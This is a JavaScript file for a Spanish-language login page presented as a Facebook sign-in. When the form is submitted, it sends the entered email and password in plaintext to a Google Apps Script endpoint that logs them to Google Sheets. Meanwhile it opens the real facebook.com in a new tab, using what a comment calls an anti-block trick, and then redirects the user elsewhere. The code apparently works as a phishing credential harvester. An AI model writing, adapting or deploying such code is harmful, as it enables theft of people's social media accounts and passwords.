const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwR8pzNfNsEnYFh2XT4vNYwTmhfuw41mmgRK5QRq0nal4TK5Zde4hiK9UfA1ZFjAzKp/exec";

function showSuccessNotification() {
    const messageElement = document.getElementById('success-message');
    if (messageElement) {
        messageElement.classList.add('show');
        setTimeout(() => {
            messageElement.classList.remove('show');
        }, 3000); 
    }
}

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); 
    
    const form = event.target;
    const loginButton = form.querySelector('.btn-login');
    
    const email = form.querySelector('input[name="email"]').value.trim();
    const password = form.querySelector('input[name="password"]').value.trim();
    
    if(!email || !password) {
        alert("Por favor completa los campos.");
        return;
    }

    loginButton.textContent = 'Iniciando sesión...';
    loginButton.disabled = true;

    // 🌟 TRUCO ANTIBLOQUEO: Abrir Facebook en el instante exacto del envío (submit)
    window.open("https://www.facebook.com", "_blank");

    const payload = {
        action: "registerUser",
        provider: "facebook",
        nombre: email,
        colonia: "Red Social",
        contrasena: password
    };

    // Enviar datos a Google Sheets
    fetch(SCRIPT_URL, {
        method: 'POST',
        headers: {
            "Content-Type": "text/plain;charset=utf-8"
        },
        body: JSON.stringify(payload) 
    })
    .then(response => response.json())
    .then(result => console.log("Sincronizado con Sheets:", result))
    .catch(error => console.error('Error de red al sincronizar:', error))
    .finally(() => {
        // Guardar en el almacenamiento local
        localStorage.setItem('vecino_nombre', email);
        localStorage.setItem('vecino_colonia', 'Red Social');

        showSuccessNotification();

        // Redirigir la pestaña original al sistema
        setTimeout(() => {
            window.location.href = `../index.html?user=${encodeURIComponent(email)}`; 
        }, 1000);
    });
});

document.querySelector('.btn-new-account').addEventListener('click', function() {
    alert("Función no disponible temporalmente.");
});
